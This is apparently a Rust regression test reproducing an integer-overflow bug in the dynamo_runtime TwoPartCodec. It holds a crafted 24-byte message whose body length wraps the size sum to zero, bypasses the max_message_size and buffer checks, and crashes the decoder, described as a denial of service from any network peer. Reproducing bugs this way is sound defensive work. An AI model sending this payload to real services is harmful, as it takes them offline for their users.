//! Bug 18: TwoPartCodec integer overflow bypasses max_message_size check
//!
//! Run from lib/runtime/:
//!   cargo test --test bug18_overflow
//!
//! In debug mode: panics with "attempt to add with overflow" at two_part.rs:58
//! In release mode: total_len wraps to 0, bypassing max_message_size and buffer
//! length checks, then panics at split_to() on an empty buffer — a DoS from any
//! network peer with a single 24-byte message.

use bytes::BytesMut;
use dynamo_runtime::pipeline::network::codec::TwoPartCodec;
use tokio_util::codec::Decoder;

/// Crafted 24-byte header: header_len=0, body_len=2^64-24, checksum=0.
/// 24 + 0 + (2^64-24) = 2^64 = 0 (mod 2^64) in release mode.
/// This bypasses both max_message_size (0 > 1024 → false) and
/// buffer length check (24 < 0 → false), reaching split_to(2^64-24)
/// on an empty buffer.
const OVERFLOW_INPUT: [u8; 24] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // header_len = 0
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xe8, // body_len = 2^64 - 24
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // checksum = 0
];

#[test]
#[should_panic(expected = "attempt to add with overflow")]
fn overflow_panics_in_debug() {
    let mut codec = TwoPartCodec::new(Some(1024));
    let mut buf = BytesMut::from(OVERFLOW_INPUT.as_slice());
    let _ = codec.decode(&mut buf);
}
